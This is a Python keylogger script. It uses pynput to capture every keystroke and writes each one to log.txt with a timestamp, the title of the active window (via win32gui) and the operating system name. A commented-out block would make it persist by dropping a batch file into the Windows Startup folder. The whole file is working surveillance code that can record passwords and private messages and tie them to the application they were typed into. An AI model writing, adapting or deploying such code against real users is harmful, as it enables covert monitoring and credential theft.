import datetime
import platform

from datetime import datetime
from pynput.keyboard import Key, Listener

#
# USER_NAME = getpass.getuser()
name_last_active_window = ""
#
#
# # def add_to_startup(file_path=""):
#    # if file_path == "":
#       # file_path = os.path.dirname(os.path.realpath(__file__))
#     # bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
#     # with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
#         # bat_file.write(r'start "" %s' % file_path)
#
#


def get_active_window():
    active_window_name = None
    import win32gui
    window = win32gui.GetForegroundWindow()
    active_window_name = win32gui.GetWindowText(window)
    return active_window_name


# print("Active window: %s" % str(get_active_window()))


def on_press(key):
    print("{0} pressed".format(key))
    write_file(key)


def write_file(key):
    global name_last_active_window
    f = open("log.txt", "a", encoding='utf-8')
    f.write("\n")
    active_window = str(get_active_window())

    if name_last_active_window != active_window:
        f.write("\n")
        f.write(f"Active window: {active_window}")
        now_time = datetime.now().time().replace(microsecond=0)
        f.write(" ")
        f.write(str(now_time))
        f.write("\n")

    name_last_active_window = active_window
    k = str(key).replace("'", "")
    now_time = datetime.now().time().replace(microsecond=0)
    f.write(str(now_time))
    f.write(' ')
    f.write(k)
    f.close()


def on_release(key):
    if key == Key.esc:
        return False


def main():
    f = open("log.txt", "w", encoding='utf-8')
    f.write("Operating system: ")
    f.write(platform.platform())
    f.write("\n")
    now_data = datetime.now().date()
    f.write(str(now_data))


if __name__ == "__main__":
    main()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


